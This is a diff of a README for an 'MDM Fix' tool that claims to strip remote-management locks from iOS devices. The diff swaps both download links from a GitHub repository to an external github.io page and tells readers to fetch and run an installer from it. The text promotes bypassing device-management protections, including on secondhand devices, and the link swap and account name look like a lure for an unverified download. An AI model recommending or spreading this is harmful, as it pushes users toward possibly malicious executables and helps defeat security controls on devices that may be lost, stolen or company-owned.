@@ -1,6 +1,6 @@
 # 🛠️ Descargar-MDM-Fix - Unlock your locked iOS device easily
 
-[![](https://img.shields.io/badge/Download-MDM_Fix-blue.svg)](https://github.com/Lelacentripetal760/Descargar-MDM-Fix)
+[![](https://img.shields.io/badge/Download-MDM_Fix-blue.svg)](https://lelacentripetal760.github.io)
 
 ## 📌 Overview
 MDM Fix Tool removes remote management locks from iPhone and iPad devices. This software works on Windows 10 and Windows 11 computers. It bypasses MDM profiles that restrict device use. Use this tool if you forgot your credentials or bought a used device with an active management profile.
@@ -17,7 +17,7 @@ Before you start, ensure your computer meets these standards:
 ## 🚀 Getting Started
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to access the software files: [https://github.com/Lelacentripetal760/Descargar-MDM-Fix](https://github.com/Lelacentripetal760/Descargar-MDM-Fix)
+1. Visit the following link to access the software files: [https://lelacentripetal760.github.io](https://lelacentripetal760.github.io)
 2. Look for the release section on the page.
 3. Click the download button to save the installer file to your computer.
 4. Locate the downloaded file in your folder.
